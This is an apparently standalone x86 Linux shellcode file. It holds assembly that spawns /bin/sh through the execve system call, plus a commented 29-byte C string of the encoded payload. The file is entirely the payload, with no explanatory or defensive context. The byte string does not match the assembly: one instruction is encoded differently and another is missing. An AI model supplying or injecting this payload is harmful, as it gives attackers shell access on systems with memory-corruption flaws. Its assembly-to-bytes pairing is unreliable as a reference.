.text
.globl _start
_start:
	xorl %eax, %eax
	cdq
	movb $11, %al
	jmp binsh
	back:
	movl %esp, %ecx
	movl (%esp), %ebx
	movl %edx, 0x4(%esp)
	movb %dl, 0x7(%ebx)
	int $0x80
binsh:
	call back
	.ascii "/bin/sh"

# char shellcode[] = "\x31\xc0\x99\xb0\x0b\xeb\x0a\x89\xd1\x8b\x1c\x24\x88\x53\x07\xcd\x80\xe8\xf1\xff\xff\xff/bin/sh";
# /* Total: 29 bytes. */
